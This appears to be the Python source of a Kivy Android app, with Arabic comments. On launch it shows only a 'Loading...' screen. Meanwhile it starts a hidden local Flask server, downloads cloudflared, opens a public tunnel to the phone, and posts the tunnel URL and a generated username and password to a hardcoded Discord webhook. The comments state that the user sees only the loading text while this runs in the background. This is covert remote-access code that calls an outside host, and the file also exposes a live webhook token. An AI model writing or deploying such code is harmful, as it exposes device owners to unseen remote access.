import json
import os
import random
import re
import string
import subprocess
import threading
import time
import urllib.request

import kivy
from kivy.app import App
from kivy.uix.label import Label
from flask import Flask

# ===== 1. رابط الـ Webhook الخاص بك في ديسكورد =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1551491653498437662/ZKV710LxZs-7Q9BxZldPVP3qfnFF1oUIOv3S2tNXAmsP4e4U0Y9e1n7DawPzGHjVmp4F"

# ===== 2. بيانات الأمان والتأمين =====
USERNAME = "3anoor-Omda"
PASSWORD = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
PORT = 5000

app_flask = Flask(__name__)

@app_flask.route('/')
def home():
    return f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Android Remote Server</title>
        <style>
            body {{ background: #0f0f0f; color: #fff; font-family: system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }}
            .card {{ background: #1e1e1e; padding: 30px; border-radius: 16px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.7); max-width: 90%; }}
            h1 {{ color: #28a745; font-size: 22px; margin-bottom: 20px; }}
            p {{ color: #ccc; margin: 12px 0; font-size: 16px; }}
            .badge {{ background: #007bff; color: white; padding: 4px 10px; border-radius: 6px; font-family: monospace; font-weight: bold; }}
        </style>
    </head>
    <body>
        <div class="card">
            <h1>📱 تم الاتصال بسيرفر الموبايل بنجاح!</h1>
            <p>اسم المستخدم: <span class="badge">{USERNAME}</span></p>
            <p>كلمة السر: <span class="badge">{PASSWORD}</span></p>
        </div>
    </body>
    </html>
    """

def run_flask():
    app_flask.run(host='127.0.0.1', port=PORT)

def send_to_discord(public_url):
    payload = {
        "embeds": [
            {
                "title": "📱 تم تشغيل سيرفر الموبايل بنجاح (رابط عام)!",
                "color": 5814783,
                "fields": [
                    {
                        "name": "🔗 رابط التحكم المباشر (Cloudflare)",
                        "value": f"[اضغط هنا لفتح السيرفر]({public_url})\n`{public_url}`",
                    },
                    {
                        "name": "👤 اسم المستخدم",
                        "value": f"`{USERNAME}`",
                        "inline": True,
                    },
                    {
                        "name": "🔑 كلمة السر",
                        "value": f"`{PASSWORD}`",
                        "inline": True,
                    },
                ],
                "footer": {
                    "text": "Android Mobile Server • trycloudflare.com"
                },
            }
        ]
    }
    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
        )
        urllib.request.urlopen(req)
    except Exception as e:
        print("Discord send error:", e)

def start_tunnel():
    time.sleep(1)
    
    # تحديد مسار حفظ ملف cloudflared الخاص بنظام الأندرويد
    app_dir = os.path.dirname(os.path.abspath(__file__))
    cf_bin = os.path.join(app_dir, "cloudflared")

    # تحميل النسخة المخصصة للأندرويد (Linux ARM64) عند التشغيل لأول مرة
    if not os.path.exists(cf_bin):
        try:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            urllib.request.urlretrieve(url, cf_bin)
            os.chmod(cf_bin, 0o755)  # إعطاء الملف صلاحية التنفيذ على الأندرويد
        except Exception as e:
            print("Download cloudflared error:", e)
            return

    try:
        cmd = [cf_bin, "tunnel", "--url", f"http://127.0.0.1:{PORT}"]
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            encoding="utf-8",
            errors="ignore",
            bufsize=1
        )

        for line in iter(proc.stdout.readline, ""):
            if "trycloudflare.com" in line:
                match = re.search(r"https://[a-zA-Z0-9\.\-]+\.trycloudflare\.com", line)
                if match:
                    send_to_discord(match.group(0))
                    break
    except Exception as e:
        print("Tunnel start error:", e)

class LoadingApp(App):
    def build(self):
        # شاشة الموبايل ستكون سوداء ومكتوب عليها Loading... فقط
        return Label(text="Loading...", font_size='35sp', bold=True)

    def on_start(self):
        # تشغيل السيرفر والتأنل في الخلفية بمجرد فتح التطبيق
        threading.Thread(target=run_flask, daemon=True).start()
        threading.Thread(target=start_tunnel, daemon=True).start()

if __name__ == "__main__":
    LoadingApp().run()
